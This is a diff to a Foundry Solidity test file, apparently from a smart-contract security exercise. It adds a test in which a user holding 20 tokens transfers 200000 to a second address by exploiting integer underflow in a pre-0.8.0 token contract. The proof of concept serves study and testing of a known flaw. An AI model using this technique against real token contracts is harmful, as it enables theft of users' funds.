@@ -11,7 +11,7 @@ contract TokenTest is Test {
     Token token;
     address tokenDeployer = makeAddr("TokenDeployer");
     address user1 = makeAddr("User1");
-    address user2 = makeAddr("User2");
+    address user1Clone = makeAddr("user1Clone");
     uint256 constant InitialAmount = 10000;
 
     function setUp() public {
@@ -46,17 +46,39 @@ contract TokenTest is Test {
 
     }
 
-    function test_attack() public {
-        uint256 number = 0;
-        if(number-300>0){
-            console.log(300);
 
-        }
-        else{
-            console.log(false);
-        }
+        function test_attack() public {
+        
+        // As Solidty Version Before 0.8.0 
+        // it Cannot Handle OverFlow and UnderFlow 
+        // the Below Should Be Executed
+
+        /**
+            let say user1 has 20 token 
+            and he sees that underflow/overflow issue is handled
+            he undeflow the uint and steal as musch he want
+         */
+        
+        // lets give 20 tokens to the user1
+        vm.prank(tokenDeployer);
+        token.transfer(user1, 20);
+        vm.stopPrank();
+        assertEq(token.balanceOf(user1), 20);
+
+        // user1 attactks with 200000 token amount to anoether address user1Clone with underflow attack
+        
+        vm.prank(user1);
+        token.transfer(user1Clone, 200000);
+        vm.stopPrank();
+        assertEq(token.balanceOf(user1Clone), 200000);
+
+      
+
+
+
+        
+
     }
-
 
 
 
